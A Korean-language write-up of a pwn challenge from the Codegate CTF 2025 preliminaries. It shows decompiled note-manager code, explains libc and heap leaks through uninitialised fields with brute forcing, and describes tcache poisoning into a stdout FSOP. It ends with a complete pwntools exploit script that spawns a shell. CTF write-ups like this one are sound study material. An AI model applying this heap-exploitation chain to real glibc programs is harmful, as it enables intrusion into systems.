---
title: "[Codegate CTF 2025 Preliminary] Secret Note Writeup"
published: 2025-05-10
description: ''
image: ''
tags: []
category: 'pwn'
draft: false
lang: ''
---

# 보호 기법

---

```
Canary                                  : Enabled
NX                                      : Enabled
PIE                                     : Enabled
RELRO                                   : Full RELRO
Fortify                                 : Not found
```

# 소스 코드

---

- structure (for reversing)
    
    ```
    00000000 struct note // sizeof=0x10
    00000000 {
    00000000     __int64 buf;
    00000008     int size;
    0000000C     int key;
    00000010 };
    ```
    
- main
    
    ```c
    int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v4; // [rsp+8h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      init();
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          __isoc99_scanf("%d", &v3);
          if ( v3 != 3 )
            break;
          delete();
        }
        if ( v3 <= 3 )
        {
          if ( v3 == 1 )
          {
            create();
          }
          else if ( v3 == 2 )
          {
            edit();
          }
        }
      }
    }
    ```
    
- create
    
    ```c
    unsigned __int64 create()
    {
      int idx_1; // ebx
      int idx; // [rsp+0h] [rbp-30h] BYREF
      unsigned int key; // [rsp+4h] [rbp-2Ch] BYREF
      note *note; // [rsp+8h] [rbp-28h]
      void *buf; // [rsp+10h] [rbp-20h]
      unsigned __int64 v6; // [rsp+18h] [rbp-18h]
    
      v6 = __readfsqword(0x28u);
      key = 0;
      printf("Index: ");
      __isoc99_scanf("%d", &idx);
      if ( idx < 0 || idx > 15 )
      {
    LABEL_9:
        puts("Error");
        return v6 - __readfsqword(0x28u);
      }
      if ( !chunks[idx] )
      {
        idx_1 = idx;
        chunks[idx_1] = malloc(0x10u);
      }
      printf("Key: ");
      __isoc99_scanf("%u", &key);
      if ( key <= 0x1000000 )
      {
        note = chunks[idx];
        printf("Size: ");
        __isoc99_scanf("%d", &note->size);
        if ( note->size <= 0x400 )
        {
          buf = malloc(note->size);
          if ( buf )
          {
            printf("Data: ");
            read(0, buf, note->size);
            note->buf = buf;
            note->key = key;
            puts("Save completed");
            return v6 - __readfsqword(0x28u);
          }
        }
        goto LABEL_9;
      }
      printf("Error");
      return v6 - __readfsqword(0x28u);
    }
    ```
    
- edit
    
    ```c
    unsigned __int64 edit()
    {
      int idx; // [rsp+8h] [rbp-18h] BYREF
      int key; // [rsp+Ch] [rbp-14h] BYREF
      note *note; // [rsp+10h] [rbp-10h]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      key = 0;
      printf("Index: ");
      __isoc99_scanf("%d", &idx);
      if ( idx >= 0
        && idx <= 15
        && (note = chunks[idx]) != 0
        && note->buf
        && (printf("Key: "), __isoc99_scanf("%u", &key), note->key == key) )
      {
        printf("Data(%d): ", note->size);
        read(0, note->buf, note->size);
        puts("Edit completed");
      }
      else
      {
        puts("Error");
      }
      return v4 - __readfsqword(0x28u);
    }
    ```
    
- delete
    
    ```c
    unsigned __int64 delete()
    {
      int idx; // [rsp+8h] [rbp-18h] BYREF
      int key; // [rsp+Ch] [rbp-14h] BYREF
      note *ptr; // [rsp+10h] [rbp-10h]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      key = 0;
      printf("Index: ");
      __isoc99_scanf("%d", &idx);
      if ( idx >= 0
        && idx <= 15
        && (ptr = chunks[idx]) != 0
        && (printf("Key: "), __isoc99_scanf("%u", &key), ptr->key == key) )
      {
        free(ptr->buf);
        ptr->buf = 0;
        ptr->key = 0;
        ptr->size = 0;
        free(ptr);
        chunks[idx] = 0;
        puts("Delete completed");
      }
      else
      {
        puts("Error");
      }
      return v4 - __readfsqword(0x28u);
    }
    ```
    

# 풀이

---

create 함수를 보면 일부러 조건문을 false로 만들어서 동작을 조절할 수 있다.

일단 libc leak을 하는 게 중요하니까 unsorted bin을 만들고 릭할 방법을 생각해봐야 한다.

unsorted bin을 만드는 건 0x400 짜리 청크 8개를 연속으로 해제하면 가능하다.

여기서 libc 릭을 어떻게 할지가 관건인데, 출력이 가능한 부분은 size 뿐이다.

main 함수를 다시 보면 key 값 조건문을 통과하지 못하면 bk 영역이 초기화 되지 않는다.

이를 활용해서 libc leak이 가능하다.

key 값 위치는 bk의 상위 4바이트인데 libc 주소는 총 6바이트이므로 2바이트 브루트 포싱을 활용해서 구할 수 있다.

edit 함수에서 key 값이 맞으면 size를 출력해주므로 key 값만 알면 bk에 남아있는 libc 주소를 얻을 수 있다.

~~이 다음은 모르겠음..~~ 

~~arena 쪽 포인터 오버라이트로 뭔가 할 수 있는 건지?~~

~~아니면 힙 릭을 추가로 한 뒤 tcache poisoning을 수행해야 하는 건지?~~ 

FSOP를 생각했는데 이럴려면 heap leak이 필요했다.

small bin을 이용해서 힙 릭을 할 수 있다.

small bin에는 safe link가 걸려 있지 않았고 bk 위치는 출력 및 브포가 가능하다.

여기서 좀 얻어 걸리긴 했는데 어떻게 하다보니 unsorted bin 2개가 연결되는 상황이 발생했다.

(아무튼 릭 됐잖아..)

이후 tcache poisoning으로 stdout에 FSOP 때리면 쉘을 얻을 수 있다.

(익스 코드 참 더럽게 짰다..)

```python
from pwn import *

def create(idx, key, size, data):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Key", str(key).encode())
    if key <= 0x1000000:
        p.sendlineafter(b"Size", str(size).encode())
        if size <= 0x400:
            p.sendafter(b"Data", data)

def edit(idx, key, data):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Key", str(key).encode())
    p.sendafter(b"Data", data)

def delete(idx, key):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Key", str(key).encode())

def libc_bruteforce():
    for key in range(0x7800, 0x8000):
        p.sendlineafter(b">", b"2")
        p.sendlineafter(b"Index: ", b"0")
        p.sendlineafter(b"Key: ", str(key).encode())

        result = p.recvn(5)
        if b"Data" in result:
            break

    high_libc = key
    low_libc = int(p.recvuntil(b")")[:-1].decode())
    return high_libc, low_libc

def heap_bruteforce():
    for key in range(0x5500, 0x5700):
        p.sendlineafter(b">", b"2")
        p.sendlineafter(b"Index: ", b"9")
        p.sendlineafter(b"Key: ", str(key).encode())

        result = p.recvn(5)
        if b"Data" in result:
            break

    high_heap = key
    low_heap = int(p.recvuntil(b")")[:-1].decode())

    p.sendline(b"0")  # nop

    return high_heap, low_heap

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# context.log_level = "debug"

p = process("./prob")
p = remote("localhost", 13378)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

for i in range(9):
    create(i, i, 0x100, b"A" * 0x100)
for i in range(9):
    delete(i, i)

for i in range(4):
    create(i + 1, i + 1, 0x10, b"B" * 0x10)

create(0, 0x1000001, 0x10, b"C" * 0x10)
high_libc, low_libc = libc_bruteforce()
libc_base = (high_libc << 32) | (low_libc & 0xFFFFFFFF) - 0x21ae00
libc.address = libc_base
print("[+] libc:", hex(libc_base))

p.sendline(b"0")  # nop

for i in range(4):
    delete(i + 1, i + 1)

for i in range(10):
    create(i + 1, i + 1, 0x110, b"A" * 0x110)
for i in range(10):
    delete(i + 1, i + 1)

for i in range(8):
    create(i + 1, i + 1, 0x110, b"A" * 0x110)

create(9, 0x1000001, 0x10, b"A" * 0x10)
high_heap, low_heap = heap_bruteforce()
heap_base = (high_heap << 32) | (low_heap & 0xFFFFFFFF) - 0x290
print("[+] heap:", hex(heap_base))
create(9, 9, 0x10, b"A" * 0x10)

for i in range(9):
    delete(i + 1, i + 1)

create(1, 1, 0xC0, b"A" * 0xC0)
delete(1, 1)

for i in range(10):
    create(i + 1, i + 1, 0xF0, b"W" * 0xF0)

delete(9, 9)
delete(5, 5)

create(4, 4, 0x1000, b"A" * 0x1000)
edit(4, 4, b"A"*0xF0 + p64(0) + p64(0x101) + p64(libc.sym["_IO_2_1_stdout_"] ^ ((heap_base >> 12) + 1)))

create(14, 14, 0xF0, b"Y" * 0xF0)

fake_fsop_struct = libc.sym["_IO_2_1_stdout_"]
FSOP = FSOP_struct(
    flags       = u64(b"\x01\x01\x01\x01;sh\x00"),
    lock        = fake_fsop_struct + 0x50,
    _wide_data  = fake_fsop_struct - 0x10,
    _markers    = libc.sym["system"],
    _unused2    = p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable      = libc.sym["_IO_wfile_jumps"] - 0x20,
    _mode       = 0xFFFFFFFF,
)

create(15, 15, 0xF0, FSOP)

p.interactive()

```
